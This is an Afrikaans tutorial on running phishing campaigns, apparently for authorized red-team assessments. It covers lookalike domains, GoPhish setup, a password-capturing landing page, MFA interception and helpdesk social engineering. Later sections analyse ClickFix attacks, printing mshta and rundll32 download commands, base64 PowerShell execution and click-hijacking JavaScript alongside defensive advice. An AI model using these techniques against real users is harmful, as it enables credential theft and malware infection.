# Phishing-metodologie

{{#include ../../banners/hacktricks-training.md}}

## Metodologie

1. Verken die slagoffer
   1. Kies die **slagofferdomein**.
   2. Doen basiese webverkenning deur te **soek na aanmeldportale** wat die slagoffer gebruik, en **besluit** watter een jy gaan **naboots**.
   3. Gebruik **OSINT** om **e-posadresse te vind**.
2. Berei die omgewing voor
   1. **Koop die domein** wat jy vir die phishing-assessering gaan gebruik
   2. **Stel die verwante e-posdiensrekords op** (SPF, DMARC, DKIM, rDNS)
   3. Stel die VPS met **gophish** op
3. Berei die veldtog voor
   1. Berei die **e-possjabloon** voor
   2. Berei die **webblad** voor om die aanmeldbesonderhede te steel
4. Begin die veldtog!

## Genereer soortgelyke domeinname of koop ’n betroubare domein

### Domeinnaamvariasietegnieke

- **Sleutelwoord**: Die domeinnaam **bevat** ’n belangrike **sleutelwoord** van die oorspronklike domein (bv. zelster.com-management.com).<sup>[[1]](#references)</sup>
- **Koppelteken-subdomein**: Vervang die **punt met ’n koppelteken** in ’n subdomein (bv. www-zelster.com).
- **Nuwe TLD**: Dieselfde domein met ’n **nuwe TLD** (bv. zelster.org)
- **Homoglyph**: Dit **vervang** ’n letter in die domeinnaam met **letters wat soortgelyk lyk** (bv. zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** Dit **ruil twee letters om** binne die domeinnaam (bv. zelsetr.com).
- **Enkelvoud/Meervoud**: Voeg “s” aan die einde van die domeinnaam by of verwyder dit (bv. zeltsers.com).
- **Weglating**: Dit **verwyder een** van die letters uit die domeinnaam (bv. zelser.com).
- **Herhaling:** Dit **herhaal een** van die letters in die domeinnaam (bv. zeltsser.com).
- **Vervanging**: Soos Homoglyph, maar minder onopvallend. Dit vervang een van die letters in die domeinnaam, moontlik met ’n letter naby die oorspronklike letter op die sleutelbord (bv. zektser.com).
- **Subdomein**: Voeg ’n **punt** binne die domeinnaam in (bv. ze.lster.com).
- **Invoeging**: Dit **voeg ’n letter** by die domeinnaam (bv. zerltser.com).
- **Ontbrekende punt**: Voeg die TLD aan die domeinnaam vas. (bv. zelstercom.com)

**Outomatiese nutsmiddels**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Webwerwe**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Daar is ’n **moontlikheid dat sommige gestoorde of oorgedraagde bisse outomaties omgekeer kan word** weens verskeie faktore, soos sonvlamme, kosmiese strale of hardewarefoute.

Wanneer hierdie konsep **op DNS-versoeke toegepas word**, is dit moontlik dat die **domein wat die DNS-bediener ontvang** nie dieselfde is as die domein waarvoor daar oorspronklik versoek is nie.

Byvoorbeeld, ’n enkele bisverandering in die domein "windows.com" kan dit verander na "windnws.com."

Aanvallers kan **dit benut deur verskeie domeine met omgekeerde bisse te registreer** wat soortgelyk is aan die slagoffer se domein. Hulle beoog om wettige gebruikers na hul eie infrastruktuur te herlei.

Vir meer inligting, lees [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/).<sup>[[10]](#references)[[11]](#references)</sup>

### Koop ’n betroubare domein

Jy kan op [https://www.expireddomains.net/](https://www.expireddomains.net) soek na ’n verstreke domein wat jy kan gebruik.\
Om seker te maak dat die verstreke domein wat jy gaan koop **reeds goeie SEO het**, kan jy nagaan hoe dit in die volgende gekategoriseer word:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Ontdekking van e-posadresse

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% gratis)
- [https://phonebook.cz/](https://phonebook.cz) (100% gratis)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Om **meer** geldige e-posadresse te **ontdek** of die adresse wat jy reeds ontdek het te **verifieer**, kan jy kyk of jy die slagoffer se SMTP-bedieners met brute force kan toets. [Leer hier hoe om e-posadresse te verifieer/ontdek](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Moet ook nie vergeet nie: as die gebruikers **enige webportaal gebruik om toegang tot hul e-pos te kry**, kan jy kyk of dit kwesbaar is vir **brute force op gebruikersname**, en die kwesbaarheid uitbuit indien moontlik.

## GoPhish opstel

### Installasie

Jy kan dit aflaai vanaf [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Laai dit af, dekomprimeer dit binne `/opt/gophish` en voer `/opt/gophish/gophish` uit\
’n Wagwoord vir die admin-gebruiker op poort 3333 sal in die uitvoer verskyn. Gaan dus na daardie poort en gebruik dié aanmeldbesonderhede om die admin-wagwoord te verander. Jy sal dalk daardie poort na plaaslik moet tonnel:

```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```

### Konfigurasie

**TLS-sertifikaatkonfigurasie**

Voor hierdie stap moet jy **reeds die domein gekoop het** wat jy gaan gebruik, en dit moet **wys na** die **IP-adres van die VPS** waarop jy **gophish** konfigureer.

```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```

**E-poskonfigurasie**

Begin met die installering: `apt-get install postfix`

Voeg dan die domein by die volgende lêers:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Verander ook die waardes van die volgende veranderlikes in /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Verander laastens die lêers **`/etc/hostname`** en **`/etc/mailname`** om jou domeinnaam te gebruik en **herbegin jou VPS.**

Skep nou ’n **DNS A-rekord** vir `mail.<domain>` wat na die **IP-adres** van die VPS wys, en ’n **DNS MX**-rekord wat na `mail.<domain>` wys.

Kom ons toets nou of ons ’n e-pos kan stuur:

```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```

**Gophish-konfigurasie**

Stop die uitvoering van Gophish en kom ons konfigureer dit.\
Wysig `/opt/gophish/config.json` soos volg (let op die gebruik van https):

```bash
{
        "admin_server": {
                "listen_url": "127.0.0.1:3333",
                "use_tls": true,
                "cert_path": "gophish_admin.crt",
                "key_path": "gophish_admin.key"
        },
        "phish_server": {
                "listen_url": "0.0.0.0:443",
                "use_tls": true,
                "cert_path": "/opt/gophish/ssl_keys/key.crt",
                "key_path": "/opt/gophish/ssl_keys/key.pem"
        },
        "db_name": "sqlite3",
        "db_path": "gophish.db",
        "migrations_prefix": "db/db_",
        "contact_address": "",
        "logging": {
                "filename": "",
                "level": ""
        }
}
```

**Konfigureer die gophish-diens**

Om die gophish-diens te skep sodat dit outomaties begin en as ’n diens bestuur kan word, kan jy die lêer `/etc/init.d/gophish` met die volgende inhoud skep:

```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
    echo 'Starting '${processName}'...'
    cd ${appDirectory}
    nohup ./$process >>$logfile 2>>$errfile &
    sleep 1
}

stop() {
    echo 'Stopping '${processName}'...'
    pid=$(/bin/pidof ${process})
    kill ${pid}
    sleep 1
}

status() {
    pid=$(/bin/pidof ${process})
    if [["$pid" != ""| "$pid" != "" ]]; then
        echo ${processName}' is running...'
    else
        echo ${processName}' is not running...'
    fi
}

case $1 in
    start|stop|status) "$1" ;;
esac
```

Voltooi die konfigurasie van die diens en toets dit deur:

```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```

## Stel die mail server en domein op

### Wag en wees legitiem

Hoe ouer ’n domein is, hoe kleiner is die kans dat dit as spam bespeur sal word. Wag dus so lank as moontlik (minstens 1 week) voordat jy die phishing-assessment uitvoer. Boonop sal die reputasie wat jy opbou beter wees as jy ’n bladsy oor ’n sektor met ’n goeie reputasie plaas.

Let daarop dat jy alles nou klaar kan instel, selfs al moet jy ’n week wag.

### Stel die Reverse DNS (rDNS)-rekord op

Stel ’n rDNS (PTR)-rekord op wat die IP-adres van die VPS na die domeinnaam laat wys.

### Sender Policy Framework (SPF)-rekord

Jy moet **’n SPF-rekord vir die nuwe domein opstel**. As jy nie weet wat ’n SPF-rekord is nie, [**lees hierdie bladsy**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Jy kan [https://www.spfwizard.net/](https://www.spfwizard.net) gebruik om jou SPF-beleid te genereer (gebruik die IP-adres van die VPS-masjien)

![SPF Wizard-vorm om ’n SPF-rekord vir ’n phishing-domein te genereer](<../../images/image (1037).png>)

Dit is die inhoud wat in ’n TXT-rekord binne die domein gestel moet word:

```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```

### Domeingebaseerde boodskapverifikasie, verslagdoening en voldoening (DMARC)-rekord

Jy moet **'n DMARC-rekord vir die nuwe domein konfigureer**. As jy nie weet wat 'n DMARC-rekord is nie, [**lees hierdie bladsy**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Jy moet 'n nuwe DNS TXT-rekord skep wat na die gasheernaam `_dmarc.<domain>` wys, met die volgende inhoud:

```bash
v=DMARC1; p=none
```

### DomainKeys Identified Mail (DKIM)

Jy moet **'n DKIM vir die nuwe domein konfigureer**. As jy nie weet wat 'n DKIM-rekord is nie, [**lees hierdie bladsy**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Hierdie tutoriaal is gebaseer op: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>

> [!TIP]
> Jy moet albei B64-waardes wat die DKIM-sleutel genereer, aaneenlas:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Toets jou e-poskonfigurasietelling

Jy kan dit doen met [https://www.mail-tester.com/](https://www.mail-tester.com)\
Maak net die bladsy oop en stuur ’n e-pos na die adres wat hulle vir jou gee:

```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```

Jy kan ook **jou e-posopstelling nagaan** deur ’n e-pos te stuur na `check-auth@verifier.port25.com` en **die antwoord te lees** (hiervoor sal jy poort **25** moet **oopmaak** en die antwoord in die lêer _/var/mail/root_ sien as jy die e-pos as root stuur).\
Maak seker dat jy al die toetse slaag:

```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```

Jy kan ook **’n boodskap na ’n Gmail-rekening onder jou beheer stuur** en die **e-posopskrifte** in jou Gmail-inkassie nagaan; `dkim=pass` behoort in die `Authentication-Results`-opskrifveld te verskyn.

```
Authentication-Results: mx.google.com;
       spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
       dkim=pass header.i=@example.com;
```

### ​Verwydering van Spamhouse-swartlys

Die bladsy [www.mail-tester.com](https://www.mail-tester.com) kan aandui of jou domein deur Spamhouse geblokkeer word. Jy kan versoek dat jou domein/IP verwyder word by: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Verwydering van Microsoft-swartlys

​​Jy kan versoek dat jou domein/IP verwyder word by [https://sender.office.com/](https://sender.office.com).

## Skep en loods GoPhish-veldtog

### Stuurprofiel

- Stel ’n **naam in om** die senderprofiel te identifiseer
- Besluit van watter rekening jy die phishing-e-posse gaan stuur. Voorstelle: _noreply, support, servicedesk, salesforce..._
- Jy kan die gebruikernaam en wagwoord leeg laat, maar maak seker dat jy Ignore Certificate Errors merk

![Create & Launch GoPhish Campaign - Sending Profile: You can leave blank the username and password, but make sure to check the Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Dit word aanbeveel om die funksie "**Stuur toets-e-pos**" te gebruik om te toets of alles werk.\
> Ek beveel aan dat jy die toets-e-posse na 10min mail-adresse stuur om te voorkom dat jy tydens toetse op ’n swartlys beland.

### E-possjabloon

- Stel ’n **naam in om** die sjabloon te identifiseer
- Skryf dan ’n **onderwerp** (niks vreemds nie, net iets wat jy in ’n gewone e-pos sou verwag)
- Maak seker dat jy "**Voeg naspoorbeeld by**" gemerk het
- Skryf die **e-possjabloon** (jy kan veranderlikes gebruik soos in die volgende voorbeeld):

```html
<html>
<head>
    <title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```

Let daarop dat **dit aanbeveel word om ’n handtekening uit ’n e-pos van die kliënt te gebruik om die e-pos geloofwaardiger te laat lyk**. Voorstelle:

- Stuur ’n e-pos na ’n **niebestaande adres** en kyk of die antwoord ’n handtekening bevat.
- Soek **openbare e-posadresse** soos info@ex.com of press@ex.com of public@ex.com en stuur vir hulle ’n e-pos. Wag dan vir die antwoord.
- Probeer om **’n geldige adres wat jy ontdek het** te kontak en wag vir die antwoord.

![Sending Profile - Email Template: Probeer om ’n geldige adres wat jy ontdek het te kontak en wag vir die antwoord](<../../images/image (80).png>)

> [!TIP]
> Die Email Template laat jou ook toe om **lêers aan te heg om te stuur**. As jy ook NTLM-uitdagings met spesiaal vervaardigde lêers/dokumente wil steel, [lees hierdie bladsy](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Skryf ’n **naam**
- **Skryf die HTML-kode** van die webblad. Let daarop dat jy webblaaie kan **invoer**.
- Kies **Capture Submitted Data** en **Capture Passwords**
- Stel ’n **herleiding** in

![Email Template - Landing Page: Kies Capture Submitted Data en Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Gewoonlik sal jy die HTML-kode van die bladsy moet wysig en ’n paar toetse plaaslik moet doen (miskien met ’n Apache-bediener) **totdat jy tevrede is met die resultate.** Skryf dan daardie HTML-kode in die blokkie.\
> Let daarop dat as jy **statiese hulpbronne** vir die HTML moet gebruik (miskien CSS- en JS-bladsye), jy dit in _**/opt/gophish/static/endpoint**_ kan stoor en dan vanaf _**/static/\<filename>**_ kan verkry.

> [!TIP]
> Vir die herleiding kan jy gebruikers **na die slagoffer se wettige hoofwebblad herlei**, of hulle byvoorbeeld na _/static/migration.html_ herlei, ’n **draaipyltjie (**[**https://loading.io/**](https://loading.io)**) vir 5 sekondes wys en dan aandui dat die proses suksesvol was**.

### Users & Groups

- Stel ’n naam in
- **Voer die data in** (let daarop dat jy die voornaam, van en e-posadres van elke gebruiker nodig het om die voorbeeldsjabloon te gebruik)

![Landing Page - Users & Groups: Voer die data in (let daarop dat jy die voornaam, van en e-posadres van elke gebruiker nodig het om die voorbeeldsjabloon te gebruik)](<../../images/image (163).png>)

### Campaign

Skep laastens ’n veldtog deur ’n naam, die e-possjabloon, die landing page, die URL, die sending profile en die groep te kies. Let daarop dat die URL die skakel sal wees wat aan die slagoffers gestuur word.

Let daarop dat die **Sending Profile jou toelaat om ’n toetsemail te stuur om te sien hoe die finale phishing-e-pos sal lyk**:

![Users & Groups - Campaign: Let daarop dat die Sending Profile jou toelaat om ’n toetsemail te stuur om te sien hoe die finale phishing-e-pos sal lyk](<../../images/image (192).png>)

Sodra alles gereed is, begin die veldtog!

## Website Cloning

As jy om enige rede die webwerf wil kloon, kyk na die volgende bladsy:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

In sommige phishing-assesserings (hoofsaaklik vir Red Teams) wil jy dalk ook **lêers stuur wat ’n soort backdoor bevat** (miskien ’n C2 of dalk net iets wat ’n verifikasie aktiveer).\
Kyk na die volgende bladsy vir voorbeelde:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

Die vorige aanval is nogal slim, aangesien jy ’n regte webwerf namaak en die inligting versamel wat die gebruiker invoer. Ongelukkig sal hierdie inligting **jou nie toelaat om die misleide gebruiker na te boots nie** as die gebruiker nie die korrekte wagwoord ingevoer het nie, of as die toepassing wat jy nagemaak het met 2FA opgestel is.

Dit is waar nutsmiddels soos [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) en [**muraena**](https://github.com/muraenateam/muraena) nuttig is. Hierdie nutsmiddel laat jou toe om ’n MitM-agtige aanval uit te voer. Basies werk die aanvalle soos volg:

1. Jy **boots die aanmeldvorm** van die regte webblad na.
2. Die gebruiker **stuur** sy **geloofsbriewe** na jou vals bladsy, en die nutsmiddel stuur dit na die regte webblad en **kontroleer of die geloofsbriewe werk**.
3. As die rekening met **2FA** opgestel is, sal die MitM-bladsy daarvoor vra. Sodra die **gebruiker dit invoer**, stuur die nutsmiddel dit na die regte webblad.
4. Sodra die gebruiker geverifieer is, sal jy (as aanvaller) **die geloofsbriewe, die 2FA, die cookie en enige inligting van elke interaksie** vasgelê het terwyl die nutsmiddel ’n MitM uitvoer.

### Via VNC

Wat as jy, in plaas daarvan om **die slagoffer na ’n kwaadwillige bladsy te stuur** wat soos die oorspronklike een lyk, hom na ’n **VNC-sessie met ’n blaaier stuur wat aan die regte webblad gekoppel is**? Jy sal kan sien wat hy doen, die wagwoord steel, die MFA wat gebruik word, die cookies...\
Jy kan dit met [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC) doen.<sup>[[3]](#references)[[4]](#references)</sup>

## Opsporing van opsporing

Een van die beste maniere om te weet of jy uitgevang is, is natuurlik om **jou domein in swartlyste te soek**. As dit gelys word, is jou domein op een of ander manier as verdag opgespoor.\
Een maklike manier om te kyk of jou domein op enige swartlys verskyn, is om [https://malwareworld.com/](https://malwareworld.com) te gebruik.

Daar is egter ander maniere om te weet of die slagoffer **aktief in die natuur na verdagte phishing-aktiwiteit soek**, soos verduidelik in:


{{#ref}}
detecting-phising.md
{{#endref}}

Jy kan **’n domein koop met ’n naam wat baie soortgelyk is** aan die slagoffer se domeinnaam **en/of ’n sertifikaat genereer** vir ’n **subdomein** van ’n domein wat deur jou beheer word, wat die slagoffer se domein se **sleutelwoord** bevat. As die **slagoffer** enige soort **DNS- of HTTP-interaksie** daarmee uitvoer, sal jy weet dat **hy aktief na verdagte domeine soek** en dat jy baie diskreet sal moet wees.<sup>[[2]](#references)</sup>

### Evalueer die phishing

Gebruik [**Phishious** ](https://github.com/Rices/Phishious)om te evalueer of jou e-pos in die strooiposvouer gaan beland, geblokkeer gaan word of suksesvol gaan wees.

## Hoë-aanraking-identiteitskompromittering (MFA-terugstelling deur hulptoonbank)

Moderne indringingsgroepe slaan e-poslokmiddels toenemend heeltemal oor en **teiken die dienslessenaar-/identiteitsherstelproses direk** om MFA te omseil. Die aanval is volledig “living-off-the-land”: sodra die operateur geldige geloofsbriewe het, beweeg hulle lateraal met ingeboude admin-nutsmiddels – geen malware word benodig nie.<sup>[[6]](#references)</sup>

### Aanvalvloei
1. Verken die slagoffer
   * Versamel persoonlike en korporatiewe besonderhede van LinkedIn, datalekke, openbare GitHub, ens.
   * Identifiseer identiteite met hoë waarde (bestuurders, IT, finansies) en bepaal die **presiese hulptoonbankproses** vir wagwoord-/MFA-terugstelling.
2. Intydse sosiale manipulasie
   * Bel, stuur ’n Teams-boodskap of gesels met die hulptoonbank terwyl jy die teiken naboots (dikwels met **vervalste beller-ID** of ’n **geklone stem**).
   * Verskaf die voorheen versamelde PII om kennisgebaseerde verifikasie te slaag.
   * Oortuig die agent om die **MFA-geheim terug te stel** of ’n **SIM-ruil** op ’n geregistreerde selfoonnommer uit te voer.
3. Onmiddellike aksies ná toegang (≤60 min in werklike gevalle)
   * Vestig ’n vastrapplek deur enige web-SSO-portaal.
   * Enumerate AD / AzureAD met ingeboude nutsmiddels (geen binaries word afgelaai nie):
     ```powershell
     # list directory groups & privileged roles
     Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

     # AzureAD / Graph – list directory roles
     Get-MgDirectoryRole | ft DisplayName,Id

     # Enumerate devices the account can login to
     Get-MgUserRegisteredDevice -UserId <user@corp.local>
     ```
   * Lateral movement met **WMI**, **PsExec** of wettige **RMM**-agente wat reeds in die omgewing op die witlys is.

### Opsporing en versagting
* Behandel herstel van helpdesk-identiteit as ’n **bevoorregte operasie** – vereis verhoogde verifikasie en bestuurdergoedkeuring.
* Ontplooi **Identity Threat Detection & Response (ITDR)** / **UEBA**-reëls wat waarskuwings genereer oor:  
  * MFA-metode verander + verifikasie vanaf ’n nuwe toestel / geografiese ligging.  
  * Onmiddellike verhoging van dieselfde principal (user-→-admin).  
* Neem helpdesk-oproepe op en vereis ’n **terugoproep na ’n reeds-geregistreerde nommer** voordat enige terugstelling gedoen word.
* Implementeer **Just-In-Time (JIT) / Privileged Access** sodat nuut-teruggestelde rekeninge nie outomaties hoëvoorregtokens erf nie.

---

## Misleiding op skaal – SEO poisoning en “ClickFix”-veldtogte
Commodity-groepe verreken die koste van operasies wat baie persoonlike aandag verg, met massa-aanvalle wat **soekenjins en advertensienetwerke in die afleweringskanaal omskep**.<sup>[[6]](#references)</sup>

1. **SEO poisoning / malvertising** stoot ’n vals resultaat soos `chromium-update[.]site` na die boonste posisie in soekadvertensies.
2. Die slagoffer laai ’n klein **eerste-fase-loader** af (dikwels JS/HTA/ISO).  Voorbeelde wat deur Unit 42 waargeneem is:
   * `RedLine stealer`
   * `Lumma stealer`
   * `Lampion Trojan`
3. Die loader eksfiltreer blaaierkoekies en aanmeldingsdatabasisse, en laai dan ’n **stil loader** af wat *intyds* besluit of dit die volgende moet ontplooi:
   * RAT (bv. AsyncRAT, RustDesk)
   * ransomware / wiper
   * persistence-komponent (registry Run key + geskeduleerde taak)

### Verhardingswenke
* Blokkeer nuut-geregistreerde domeine en dwing **Advanced DNS / URL Filtering** af vir *soekadvertensies* sowel as e-pos.
* Beperk sagteware-installasie tot ondertekende MSI- / Store-pakkette; weier die uitvoering van `HTA`, `ISO`, `VBS` volgens beleid.
* Monitor vir kinderprosesse van blaaiers wat installeerders oopmaak:
  ```yaml
  - parent_image: /Program Files/Google/Chrome/*
    and child_image: *\\*.exe
  ```
* Soek na LOLBins wat gereeld deur eerste-fase-laaiers misbruik word (bv. `regsvr32`, `curl`, `mshta`).

### Kaping van klik op aflaaiknoppie met TDS-oordrag
Sommige vals sagtewareportale laat die sigbare aflaai-`href` na die **werklike** GitHub-/vrystelling-URL wys, maar kaap die **eerste** gebruikerinteraksie met JavaScript en stuur die slagoffer eerder in ’n **Traffic Distribution System (TDS)**-ketting in.<sup>[[9]](#references)</sup>

```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
  if (!isEligibleClick(e.target)) return;
  cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
  e.stopImmediatePropagation();
  e.preventDefault();
}, true);
```

Sleutelkenmerke:
- Die hook loop gewoonlik in die **vasleggingsfase** (`true`) op `document`, sodat dit voor werf-hanteerders afgaan.
- Chrome gebruik dikwels `mousedown` in plaas van `click` om die redirect aan ’n geldige **gebruikersgebaar** gekoppel te hou en die omseiling van opspringblokkering te verbeter.
- Sommige variante maak vooraf `about:blank` oop of sintetiseer `<a target="_blank">`-klikke en ken eers later die TDS-URL toe.
- Beperkings aan die browser-kant word dikwels in `localStorage` gestoor, sodat die **eerste klik** moontlik by malware uitkom, terwyl herlaaie/herpogings terugval na die sigbare skakel wat onskuldig lyk.
- Die TDS kan volgens referrer, inskrywingsdomein, GEO, browser-/toestelfingerafdruk, VPN-/datasentrumkontroles, klik-konteks en sessietellers filter, wat ontleder-herspeelaksies onvoorspelbaar maak.

Idees vir verdedigers:
- Vergelyk die **vertoonde** `href` met die **werklike** navigasieteiken wat tydens die klik gegenereer word.
- Soek na `document.addEventListener(..., true)`-hanteerders wat beide `preventDefault()` en `stopImmediatePropagation()` rondom `window.open`, `about:blank` of sintetiese ankorklikke aanroep.
- Behandel groepe nuut geregistreerde sagteware-aflaaidomeine wat almal dieselfde CloudFront-/JS-stadium laai as ’n sterk SEO-poisoning-/TDS-patroon.

### ClickFix vanaf vals verifikasiebladsye + argiefagtige LOLBAS-afhaalaksies
Sommige TDS-takke eindig op ’n vals verifikasiebladsy (Cloudflare/IUAM-styl) wat die slagoffer aansê om ’n betroubare Windows-binêre lêer soos die volgende uit te voer:<sup>[[9]](#references)</sup>

```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```

Notas:
- `mshta.exe` voer die **HTA/VBScript aan die begin van die response** uit, selfs al gee die URL voor dat dit ’n `.7z`-argief is; data wat aan die argief geheg is, kan suiwer afleiding wees.
- Opvolgfases gee dikwels steeds ’n wanindruk oor die lêertipe (`.rtf` vir PowerShell, `.asar` vir Python, ZIP-lêers met opgevulde binaries) en skakel dan oor na **handmatige PE-mapping / uitvoering in geheue**.
- As jy op een van hierdie kettings reageer, bewaar **netwerk- en geheuedata vanaf die eerste suksesvolle uitvoering**: latere herhalings wys dalk net ’n onskadelike installer/SFX-pad, of misluk omdat die vrystelling van die payload/sleutel aan die oorspronklike TDS-sessie gekoppel was.

### ClickFix-DLL-afleweringstaktiek (vals CERT-opdatering)
* Lokmiddel: ’n gekloonde nasionale CERT-advies met ’n **Update**-knoppie wat stap-vir-stap-“regmaak”-instruksies vertoon. Slagoffers word aangesê om ’n batch-lêer uit te voer wat ’n DLL aflaai en dit via `rundll32` uitvoer.<sup>[[12]](#references)</sup>
* Tipiese batch-ketting wat waargeneem is:
  ```cmd
  echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
  echo timeout /t 10
  echo rundll32.exe "%TEMP%\notepad2.dll",notepad
  ```
  * `Invoke-WebRequest` plaas die payload in `%TEMP%`; ’n kort sleep verberg netwerk-jitter, waarna `rundll32` die uitgevoerde toegangspunt (`notepad`) aanroep.
* Die DLL stuur die gasheeridentiteit as ’n beacon en peil C2 elke paar minute. Afgeleë taakopdragte kom aan as **base64-gekodeerde PowerShell**, wat versteek en met ’n beleidsomseiling uitgevoer word:
  ```powershell
  powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
  ```
  * Dit behou C2-buigsaamheid (die bediener kan take verander sonder om die DLL by te werk) en versteek konsolevensters. Soek na PowerShell-kinderprosesse van `rundll32.exe` wat `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` saam gebruik.
  * Verdedigers kan soek na HTTP(S)-callbacks in die vorm `...page.php?tynor=<COMPUTER>sss<USER>` en 5-minute-peilingsintervalle ná DLL-laai.

---

## Vertoongeaktiveerde malvertising deur RTB

Anders as ’n geborgde soekresultaat wat ’n klik vereis, kan ’n RTB-advertensie derdeparty-JavaScript laai wanneer die advertensie se kreatiewe inhoud op ’n webwerf of in ’n toepassing weergegee word. Citizen Lab het waargeneem dat advertensieskrifte ’n aparte besluitbediener met advertensie-identifiseerders kontak. Die meeste indrukke het ’n leë antwoord ontvang; geselekteerde indrukke kon JavaScript ontvang. ’n Goedaardige antwoord tydens herspeel bewys dus nie dat elke kyker dieselfde inhoud ontvang het nie.<sup>[[14]](#references)</sup>

